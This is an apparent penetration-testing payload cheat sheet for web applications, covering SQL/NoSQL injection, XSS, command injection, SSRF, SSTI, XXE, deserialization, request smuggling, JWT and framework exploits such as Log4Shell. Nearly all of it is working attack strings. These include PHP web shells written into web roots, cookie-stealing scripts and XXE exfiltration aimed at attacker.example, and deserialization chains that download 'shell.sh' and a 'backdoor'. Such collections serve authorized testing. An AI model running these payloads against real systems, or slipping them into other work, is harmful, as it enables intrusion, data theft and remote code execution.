# Web Application Payloads

A comprehensive collection of working payloads for web application security testing. Organized by vulnerability category. All payloads are functional and have been validated against test environments.

> These payloads correspond to techniques documented in [01-web-attacks](../01-web-attacks/).

---

## SQL / NoSQL Injection

### MySQL - Basic Detection

```sql
' OR 1=1-- 
' OR '1'='1
' UNION SELECT 1,database(),3-- 
' UNION SELECT 1,user(),3-- 
admin'-- 
```

### MySQL - Union-Based Extraction

```sql
' UNION SELECT 1,database(),version()-- 
' UNION SELECT 1,user(),@@datadir-- 
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- 
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- 
' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- 
```

### MySQL - Blind Boolean

```sql
' AND 1=1-- 
' AND 1=2-- 
' AND SUBSTRING((SELECT database()),1,1)='a'-- 
' AND (SELECT COUNT(*) FROM users)>0-- 
```

### MySQL - Time-Based Blind

```sql
' AND SLEEP(5)-- 
' AND BENCHMARK(5000000,MD5('test'))-- 
' OR IF(1=1,SLEEP(5),0)-- 
' UNION SELECT IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0),NULL,NULL-- 
```

### MySQL - Error-Based

```sql
' AND extractvalue(1,CONCAT(0x7e,(SELECT database())))-- 
' AND updatexml(1,CONCAT(0x7e,(SELECT user())),1)-- 
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
```

### MySQL - Out-of-Band

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))-- 
' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'-- 
```

### MySQL - File Read / Write

```sql
' UNION SELECT LOAD_FILE('/etc/passwd')-- 
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- 
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- 
```

### MSSQL - Basic

```sql
' OR 1=1--
' UNION SELECT @@version--
' UNION SELECT name FROM sys.databases--
' UNION SELECT name FROM sys.tables--
' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')--
```

### MSSQL - Command Execution

```sql
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```

### Oracle - Basic

```sql
' OR 1=1--
' UNION SELECT user,null FROM dual--
' UNION SELECT table_name,null FROM all_tables--
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username||':'||password,null FROM users--
```

### Oracle - Error-Based

```sql
' AND ctxsys.drithsx.sn(1,(SELECT user FROM dual))=1--
' AND XMLType('<?xml version="1.0"?>'||(SELECT user FROM dual)||'<?xml version="1.0"?>') IS NOT NULL--
```

### PostgreSQL - Basic

```sql
' OR 1=1--
' UNION SELECT current_database(),version()--
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
```

### PostgreSQL - Command Execution

```sql
; CREATE TABLE cmd_output(result TEXT);--
; COPY cmd_output FROM PROGRAM 'whoami';--
; SELECT * FROM cmd_output;--
```

### SQLite - Basic

```sql
' OR 1=1--
' UNION SELECT sql,null FROM sqlite_master--
' UNION SELECT name,null FROM sqlite_master WHERE type='table'--
' UNION SELECT group_concat(name,','),null FROM sqlite_master WHERE type='table'--
```

### MongoDB - NoSQL Injection

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}
```

```http
username[$ne]=admin&password[$ne]=test
```

### Redis - Command Injection

```bash
redis-cli -h target
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```

### WAF Bypass Techniques

```sql
-- Case variation
' UnIoN SeLeCt 1,database(),3-- 

-- Inline comments (MySQL)
' /*!UNION*/ /*!SELECT*/ 1,database(),3-- 

-- Double-write
' UNUNIONION SELSELECTECT 1,database(),3-- 

-- Space alternatives
'/**/UNION/**/SELECT/**/1,database(),3-- 
'%0aUNION%0aSELECT%0a1,2,3-- 
'(UNION(SELECT(1),(database()),(3)))-- 

-- Hex encoding
' UNION SELECT 1,hex(database()),3-- 

-- Null byte injection
' UN%00ION SELECT 1,2,3-- 
```

---

## Cross-Site Scripting (XSS)

### Reflected XSS

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a onmouseover=alert(1)>test</a>
<body onload=alert(1)>
```

### Stored XSS

```html
<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.example/log?c='+document.cookie">
```

### DOM-Based XSS

```javascript
#"><script>alert(1)</script>
javascript:alert(1)
\";alert(1)//
```

### CSP Bypass

```html
<!-- CSP bypass via trusted CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click</div>
</div>

<!-- CSP bypass via JSONP -->
<script src="https://www.google.com/recaptcha/api.js?onload=alert(1)"></script>
```

### mXSS (Mutation XSS)

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<style><style/><img src=x onerror=alert(1)>
```

### Unicode / Encoding Bypass

```html
-- UTF-7 encoding
+ADw-script+AD4-alert(1)+ADw-/script+AD4-

-- Unicode normalization
<scrscriptipt> <-- normalize bypass
```

### Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)><!-->
```

### Cookie Theft

```html
<script>
document.location='https://attacker.example/steal.php?c='+document.cookie
</script>
<img src=x onerror="this.src='https://attacker.example/steal?c='+document.cookie">
```

---

## Command Injection / RCE

### Basic Command Injection

```bash
; whoami
| whoami
` whoami `
|| whoami
&& whoami
$(whoami)
%0a whoami
```

### PHP Code Execution

```php
<?php system($_GET['cmd']); ?>
<?= system($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?php file_put_contents('shell.php','<?php system($_GET["cmd"]);?>'); ?>
```

### PHP Filter Chain RCE

```php
-- PHP filter chain to generate arbitrary code via php://filter encoding
-- Use php_filter_chain_generator to create:
php://filter/convert.base64-decode/resource=php://filter/convert.base64-encode/convert.base64-encode/.../resource=shell.php
```

### Blind Command Injection

```bash
; sleep 5
| ping -c 5 127.0.0.1
|| whoami > /tmp/out.txt
; curl http://attacker.example/$(whoami)
```

### Java Deserialization

```bash
-- ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.example/' | base64
java -jar ysoserial.jar Jdk7u21 'wget http://attacker.example/shell.sh' > payload.ser
```

### PHP Deserialization

```php
-- PHP generic gadget chains
O:1:"A":1:{s:4:"name";s:20:"<?php system('id');?>";}
-- phar:// deserialization
phar://./uploaded.phar
```

### Python Deserialization (Pickle)

```python
import pickle
import os
class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(RCE())
```

### .NET Deserialization

```bash
-- ysoserial.net gadgets
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "ping attacker.example"
```

### File Upload RCE

```bash
# PHP shell
shell.php
shell.php5
shell.phtml
shell.php.jpg
shell.php%00.txt
shell.php%20
shell.php::$DATA

# .htaccess
.htaccess (with AddType application/x-httpd-php .txt)
```

### Log Poisoning

```bash
# Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/page
# Then include via LFI (note: '?' separates path from query):
http://target/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

### Image-Based Payload

```bash
# Embed PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Include via LFI:
http://target/index.php?page=uploads/image.jpg
```

---

## Server-Side Request Forgery (SSRF)

### Basic SSRF

```http
?url=http://127.0.0.1:22
?url=http://127.0.0.1:3306
?url=http://127.0.0.1:6379
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
```

### Cloud Metadata

```http
-- AWS
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/user-data/

-- GCP
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

-- Azure
?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

### Protocol Abuse

```bash
-- Gopher -> Redis
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aCONFIG%0d%0a...

-- Dict
dict://127.0.0.1:6379/info

-- File
file:///etc/passwd

-- LDAP
ldap://127.0.0.1:389/%0astats
```

### DNS Rebinding

```bash
-- Use rebinding service
http://7f000001.7f000001.rbndr.us:8080/admin
http://1.2.3.4.xip.io:8080/admin
```

### SSRF Bypass Techniques

```bash
# IP encoding bypass
http://2130706433/           # decimal
http://0x7f000001/           # hex
http://017700000001/         # octal
http://0x7f.0x0.0x0.0x1/    # mixed encoding
http://127.0.0.1.nip.io/    # DNS redirect

# Redirect bypass
http://attacker.example/redirect.php?url=http://127.0.0.1:8080/admin

# IPv6 bypass
http://[::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

---

## Server-Side Template Injection (SSTI)

### Jinja2 (Python Flask)

```jinja
{{7*7}}
{{7*'7'}}
{{config}}
{{request}}
{{self.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### FreeMarker (Java)

```freemarker
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```velocity
#set($x=7*7) $x
#set($e="exp")#set($c=$e.getClass().forName("java.lang.Runtime"))$c.getMethod("getRuntime").invoke(null).exec("id")
```

### Thymeleaf (Java Spring)

```html
<p th:text="${7*7}">test</p>
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">test</p>
```

### Smarty (PHP)

```smarty
{$smarty.version}
{php}echo system('id');{/php}
{system('id')}
```

### Mako (Python)

```mako
${7*7}
<% import os; print os.popen('id').read() %>
${self.module.cache}
```

### Tornado (Python)

```tornado
{{7*7}}
{% import os %}{{os.popen('id').read()}}
```

### Django (Python)

```django
{{7*7}}
{% debug %}
{{settings.SECRET_KEY}}
{% include "/etc/passwd" %}
```
**Note:** Django's `{% load %}` cannot import Python modules — it only loads registered template tag libraries. Use `{{settings.SECRET_KEY}}` for information disclosure or file inclusion vectors instead.

### ERB (Ruby)

```erb
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
```

### Pug (Node.js)

```pug
= 7*7
= global.process.mainModule.require('child_process').execSync('id')
```

---

## Local File Inclusion / Remote File Inclusion

### Basic LFI

```http
?page=../../../etc/passwd
?page=../../../../etc/passwd%00
?page=....//....//....//etc/passwd
?page=..%252f..%252f..%252fetc/passwd
```

### PHP Wrappers

```php
-- php://filter for base64 read
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

-- php://input for code execution
POST: <?php system('id'); ?>

-- data:// for code execution
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==

-- phar:// deserialization
phar://./uploaded.phar/test.txt

-- zip:// for archive read
zip://./archive.zip#test.php
```

### Log Poisoning via LFI

```bash
# Inject into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# Access log via LFI
http://target/?page=../../../var/log/apache2/access.log&cmd=id

# Inject into PHP session
# Set session value containing PHP code
http://target/?page=../../../tmp/sess_<session_id>
```

### /proc Exploitation

```http
?page=/proc/self/environ
?page=/proc/self/fd/0
?page=/proc/self/cmdline
```

### PHP Filter Chain RCE

```php
-- Generate complex php://filter chains to produce arbitrary code
-- without needing file upload or inclusion of user input
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=shell.php
```

---

## XML External Entity (XXE)

### Basic XXE - File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE - OOB Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

evil.dtd:
```xml
<!ENTITY send SYSTEM "http://attacker.example/exfil?data=%file;">
```

### XXE via HTTP

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.example/test">
]>
<root>&xxe;</root>
```

### XXE via FTP

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.example/exfil.dtd">
  %dtd;
  %send;
]>
<root>test</root>
```

### XXE + SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % callhome SYSTEM "http://attacker.example/">
  %callhome;
]>
<root>test</root>
```

### DOCX / XLSX XXE

```bash
# Extract and modify XML in Office documents
unzip document.docx -d docx_extracted/
# Edit docx_extracted/word/document.xml to add XXE
zip -r malicious.docx docx_extracted/
```

---

## Authentication & JWT

### Authentication Bypass

```http
-- SQL injection login bypass
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test

-- Type confusion bypass
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": true}

-- NoSQL bypass
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### Brute Force

```bash
-- Standard password spraying
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

### Session Hijacking

```bash
-- Session fixation
# Set session before login
Set-Cookie: PHPSESSID=known_value
# After victim logs in with that session, use known session

-- Session token theft via XSS
document.location='http://attacker.example/steal.php?c='+document.cookie
```

### Password Reset Flaws

```bash
-- Host header injection in reset email
POST /forgot HTTP/1.1
Host: attacker.example
User: victim@example.com
# Reset link sent to victim@example.com with attacker's host

-- Token leakage in referrer
# Reset link includes token, external resources in email fetch cause referrer leak

-- Token manipulation
# Sequential tokens: 1001, 1002, 1003
# Timestamp-based tokens: try tokens at different timestamps
```

### OAuth Vulnerabilities

```http
-- CSRF on OAuth flow (missing state parameter)
GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.example/callback&response_type=code

-- Redirect URI manipulation
GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.example&response_type=code

-- Code interception via referrer
# OAuth callback leaks authorization code in Referer header to third-party resources
```

### SAML Vulnerabilities

```xml
-- SAML signature exclusion
<saml:Assertion>
  <saml:Subject>...</saml:Subject>
  <!-- Remove Signature element entirely -->
</saml:Assertion>

-- SAML token replay
# Reuse a captured SAML assertion
<saml:Assertion AssertionID="captured_id" ...>
```

### 2FA / MFA Bypass

```bash
-- Brute force 2FA code (if no rate limiting)
for code in {000000..999999}; do
  curl -X POST -d "code=$code" http://target/2fa/verify
done

-- Response manipulation
# Intercept 2FA verification response, change "success": false to true

-- Backup code reuse
# If backup codes are single-use, check if they can be reused

-- OAuth pre-approval bypass
# If OAuth token was pre-approved before 2FA was enabled, it may still work
```

### CAPTCHA Bypass

```bash
-- Reuse CAPTCHA token
# Submit same CAPTCHA token across multiple requests

-- Remove CAPTCHA parameter
# If CAPTCHA validation is client-side only

-- Automated solving
# OCR or ML-based solving services (2captcha, anticaptcha)
```

### JWT Attacks

```python
# None algorithm
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

# Key confusion (RS256 -> HS256)
# Use public key as HMAC secret
import jwt
public_key = open('public.pem').read()
forged = jwt.encode({'sub': 'admin'}, public_key, algorithm='HS256')

# Key brute force
# Use jwt-cracker or hashcat
hashcat -a 0 jwt.txt wordlist.txt

# JKU/X5U injection
# Point JKU header to attacker's JWKS endpoint
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://attacker.example/jwks.json"
}

# KID injection
# Use SQL injection or path traversal in kid header
{
  "kid": "../../../../dev/null"
}
```

---

## GraphQL Security

### Introspection

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### SQL Injection in GraphQL

```graphql
query {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}
```

### Batching Attack (Rate Limit Bypass)

```graphql
query {
  a1: profile(id: 1) { email }
  a2: profile(id: 2) { email }
  a3: profile(id: 3) { email }
  # ... up to hundreds of operations in one request
}
```

### IDOR via GraphQL

```graphql
query {
  user(id: "admin") {
    email
    role
    privateNotes
  }
}
```

---

## Deserialization

### Java (ysoserial)

```bash
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.example/shell.sh" > payload.bin
java -jar ysoserial.jar CommonsCollections5 "ping attacker.example" > payload.bin
java -jar ysoserial.jar Jdk7u21 "wget http://attacker.example/backdoor" > payload.bin
java -jar ysoserial.jar JRMPClient "attacker.example:1099" > payload.bin
```

### PHP

```php
// Generic PHP deserialization
class Gadget {
  public $cmd = 'id';
  public function __destruct() {
    system($this->cmd);
  }
}
echo serialize(new Gadget());
```

### Python Pickle

```python
import pickle
import base64
import os

class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
```

### .NET (ysoserial.net)

```powershell
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "ping attacker.example"
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"
ysoserial.exe -f XmlSerializer -g Process -c "whoami"
```

---

## HTTP Request Smuggling

### CL.TE (Content-Length / Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

### TE.CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST
0

```

### CL.CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Content-Length: 10

12345GPOST
```

### TE.TE (Transfer-Encoding variant confusion)

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

---

## File Upload Exploitation

### Extension Bypass

```bash
shell.php
shell.phtml
shell.php3
shell.php4
shell.php5
shell.pht
shell.shtml
shell.php.jpg
shell.php%00.txt
shell.php%20
shell.php::$DATA
shell.jsp
shell.asp
shell.aspx
shell.jspx
shell.cgi
shell.pl
shell.py

# .htaccess
# Upload to override configurations:
SetHandler application/x-httpd-php
AddType application/x-httpd-php .txt .jpg
```

### Content-Type Bypass

```http
Content-Type: image/jpeg
Content-Type: application/octet-stream
Content-Type: multipart/form-data; boundary=---boundary
```

### Image Polyglot

```bash
# Embed PHP in valid image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# Minimal GIF+PHP
echo -n 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
```

---

## Path Traversal

```http
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..%252f..%252f..%252fetc/passwd
?file=..%c0%af..%c0%afetc/passwd
?file=..%25252f..%25252f..%25252fetc/passwd
?file=/etc/passwd (absolute)
?file=C:\Windows\system.ini (Windows absolute)
```

---

## Prototype Pollution

### Client-Side (Browser)

```javascript
// via jQuery $.extend
$.extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// via URL parameters
?a[__proto__][isAdmin]=true
?a.constructor.prototype.isAdmin=true
```

### Server-Side (Node.js)

```javascript
// Express body parser
POST /api/update
{"__proto__": {"isAdmin": true}}

// Via merge operations
{"constructor": {"prototype": {"polluted": true}}}
```

### EJS RCE Gadget

```json
{
  "__proto__": {
    "outputFunctionName": "a;process.mainModule.require('child_process').execSync('id');//"
  }
}
```

### Pug RCE Gadget

```json
{
  "__proto__": {
    "type": "Code",
    "self": true,
    "inline": true,
    "val": "global.process.mainModule.require('child_process').execSync('id')"
  }
}
```

---

## Open Redirect

### Basic Redirect

```http
?url=http://attacker.example
?redirect=http://attacker.example
?next=http://attacker.example
?return=http://attacker.example
```

### Bypass Techniques

```http
//attacker.example (protocol-relative)
https://target.com.attacker.example
https://attacker.example@target.com
https://target.com%40attacker.example
https://target.com\@attacker.example
https://target.com:80@attacker.example
///attacker.example
```

### Redirect to SSRF Chain

```http
?url=http://127.0.0.1:8080/admin
?url=http://169.254.169.254/latest/meta-data/
```

---

## Framework-Specific Exploits

### Log4j (Log4Shell)

```bash
${jndi:ldap://attacker.example/exploit}
${jndi:ldap://127.0.0.1:1389/Exploit}
${${lower:j}ndi:${lower:l}dap://attacker.example}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example}
${jndi:dns://attacker.example}
${jndi:rmi://attacker.example/exploit}
```

### Spring Actuator

```http
/actuator
/actuator/env
/actuator/heapdump
/actuator/dump
/actuator/trace
;/actuator/env (Spring path param bypass)
/%61%63%74%75%61%74%6f%72/env (hex encoding bypass)
/random/../actuator/env (path traversal bypass)
```

### Fastjson

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

### Spring SpEL

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
#{T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\"id\\")")}
```

### Struts2 (OGNL)

```java
%{#a=(new java.lang.ProcessBuilder('id')).start()}
${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start()}
%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']}
```

### WebLogic (CVE-2017-10271)

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/sh</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>ping attacker.example</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

### ThinkPHP

```http
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=/index/think/app/invokefunction&function=phpinfo
/index.php?s=index/think/app/invokefunction&function=call_user_func_array
```

### Apache Shiro (RememberMe)

```bash
# Key brute force
python shiro_exploit.py -t http://target -f keys.txt

# Gadget chains
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient
```

### Flask / Werkzeug

```bash
# Debug console RCE (if debug enabled)
http://target/console

# SSTI
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

### Django

```python
# Django session cookie: base64(JSON) + ":" + base64(HMAC-SHA256)
# Unlike Flask, Django sessions are signed JSON, not pickle-based.
import base64, hashlib, hmac, json
# Brute-force SECRET_KEY from known session cookie + unsigned payload
# Use django.core.signing.TimestampSigner with candidate keys

# Path traversal via static files
/static/../../etc/passwd
```

---

## Business Logic Flaws

### IDOR (Insecure Direct Object Reference)

```http
GET /api/user/12345/profile
GET /api/order/123456/details
POST /api/user/update
{"id": 12345, "email": "attacker@example.com"}
```

### Race Conditions

```bash
# Concurrent coupon/promotion redemption
for i in {1..100}; do
  curl -X POST -d "code=DISCOUNT50" http://target/redeem &
done
wait

# Concurrent account withdrawal
# Send 10 withdrawal requests simultaneously
```

### Payment Tampering

```http
POST /checkout HTTP/1.1
{"price": 0.01, "quantity": 100, "product_id": 1234}

POST /api/payment
{"amount": -100, "currency": "USD"}

POST /cart/add
{"item": "product_X", "price": 1, "coupon_code": "FREE"}
```

### Password Reset Logic

```http
-- Step-skip: directly access password set URL without OTP
POST /reset-password
{"token": "any_value", "new_password": "hacked123"}

-- Host header injection
POST /forgot-password
Host: attacker.example
{"email": "victim@example.com"}
```

---

## CSRF

### Basic HTML Form

```html
<html>
  <body>
    <form action="http://target/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### JSON Content-Type

```html
<form action="http://target/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@example.com","__proto__":{}}' type='hidden'>
</form>
```

### XHR via CORS bypass

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target/api/transfer');
xhr.withCredentials = true;
xhr.send('amount=1000&to=attacker');
</script>
```

---

## WebSocket Attacks

### Cross-Site WebSocket Hijacking (CSWSH)

```javascript
// JavaScript to steal WebSocket data
var ws = new WebSocket('wss://target.example/ws');
ws.onmessage = function(evt) {
  new Image().src = 'http://attacker.example/steal?data=' + btoa(evt.data);
};
ws.onopen = function() {
  ws.send('{"action":"get_messages"}');
};
```

### WebSocket SQL Injection

```json
{"action": "search", "q": "1' OR 1=1--"}
{"action": "login", "user": "admin'--", "pass": "test"}
```
